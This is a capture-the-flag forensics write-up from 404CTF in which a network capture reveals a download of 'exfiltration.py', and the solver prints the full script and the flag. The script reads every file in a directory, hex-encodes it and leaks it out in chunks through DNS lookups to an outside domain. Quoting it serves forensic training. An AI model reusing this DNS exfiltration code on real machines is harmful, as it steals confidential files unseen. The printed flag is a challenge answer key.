#  Forensics / Un agent compromis [1/3]

## Challenge (Easy)
Nous avons surpris un de nos agents en train d'envoyer des fichiers confidentiels depuis son ordinateur dans nos locaux vers Hallebarde. Malheureusement, il a eu le temps de finir l'exfiltration et de supprimer les fichiers en question avant que nous l'arrêtions.

Heureusement, nous surveillons ce qu'il se passe sur notre réseau et nous avons donc une capture réseau de l'activité de son ordinateur. Retrouvez le fichier qu'il a téléchargé pour exfiltrer nos fichiers confidentiels.

## Inputs
- PCAP file: [capture-reseau.pcapng](./capture-reseau.pcapng)

## Solution
Looking at HTTP packets, we notice this pretty explicit `GET request`, downloading the python `exfiltration.py` script in clear:
```
GET /exfiltration.py HTTP/1.1
Host: hallebarde.404ctf.fr
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://hallebarde.404ctf.fr/
Upgrade-Insecure-Requests: 1
```

The script content is pulled in the corresponding HTTP response; The flag is in clear in the python code:
```python
import binascii
import os
import dns.resolver
import time

def read_file(filename):
    with open(filename, "rb") as f:
        return binascii.hexlify(f.read())


def exfiltrate_file(filename):
    dns.resolver.resolve("never-gonna-give-you-up.hallebarde.404ctf.fr")
    time.sleep(0.1)
    dns.resolver.resolve(binascii.hexlify(filename.encode()).decode() + ".hallebarde.404ctf.fr")
    content = read_file(filename)
    time.sleep(0.1)
    dns.resolver.resolve("626567696E.hallebarde.404ctf.fr")
    time.sleep(0.1)
    for i in range(len(content)//32):
        hostname = content[i * 32: i * 32 + 32].decode()
        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")
        time.sleep(0.1)
    if len(content) > (len(content)//32)*32:
        hostname = content[(len(content)//32)*32:].decode()
        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")
        time.sleep(0.1)
    dns.resolver.resolve("656E64.hallebarde.404ctf.fr")
    time.sleep(60)


if __name__ == "__main__":
    files = os.listdir()
    print(files)
    for file in files:
        print(file)
        exfiltrate_file(file)


flag = """404CTF{t3l3ch4rg3m3n7_b1z4rr3}"""
```

## Flag
404CTF{t3l3ch4rg3m3n7_b1z4rr3}
